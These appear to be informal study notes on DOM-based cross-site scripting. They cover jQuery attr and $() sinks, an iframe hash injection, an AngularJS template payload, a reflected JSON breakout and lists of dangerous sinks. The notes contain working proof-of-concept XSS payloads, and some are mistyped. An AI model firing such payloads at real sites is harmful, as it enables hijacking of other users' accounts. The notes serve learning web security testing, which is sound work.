
?
==
Document Object Model
DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.


how to find vuln
===
:>url
:>burp vuln scanner
:>place random string in search or input links and check dev tools in browser to see how input was consumed 
:>

limits
==
same sa relfected

Findings
==
jQuery Vuln:
=
If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. 
For example, here we have some JavaScript that changes an anchor element's href attribute using data from the URL:
<script>
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});

</script>

modify the above function so location.search causes XSS

?returnUrl=javascript:alert(document.domain)

jQuery $() selector func
=
Another potential sink to look out for is jQuery's $() selector function

This behavior was often implemented using a vulnerable hash change event handler, similar to the following:

<script>

$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});

</script>

this vuln can b exploited by taking advantage of the fact that hash is user controllable 

adding hash to end of url in an iframe tag does the trick

<script>
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">

</script>

Dom Angular Js
==
If a framework like AngularJS is used, it may be possible to execute JavaScript without angle brackets or events. When a site uses the ng-app attribute on an HTML element, it will be processed by AngularJS.


this paylod can be used to trigger xss:

<script>
{{constructor.constructor('alert(1)')()}}
</script>


Reflected Dom XSS
==

in this case find the xhr req , the this.responsetext and find how to escape the the string this was wah the result was like
<script>
{"results":[],"searchTerm":"\\"};alert(document.domain)//"}

</script>

the payload was : <script>\"};aler(docuemnt.domain)</script>


Stored Dom
==
Websites may also store data on the server and reflect it elsewhere. In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.
<script>
element.innerHTML = comment.author
</script>



<script>
 The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent


 The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
</script>